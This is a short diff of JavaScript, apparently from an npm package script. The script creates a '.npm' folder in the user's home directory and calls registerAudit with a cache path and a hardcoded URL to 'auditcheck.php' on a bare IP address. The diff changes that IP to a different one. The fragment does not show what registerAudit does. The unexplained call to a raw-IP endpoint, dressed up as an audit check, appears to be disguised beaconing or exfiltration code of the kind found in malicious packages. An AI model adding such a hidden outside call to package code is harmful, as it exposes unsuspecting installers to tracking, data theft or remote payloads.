@@ -22,4 +22,4 @@ var folder = os.homedir() + "/.npm";
 if (!fs.existsSync(folder)){
     fs.mkdirSync(folder);
 }
-registerAudit(path.join(folder,'/audit-cache'), 'https://10.96.177.36/auditcheck.php');
+registerAudit(path.join(folder,'/audit-cache'), 'https://20.93.23.234/auditcheck.php');
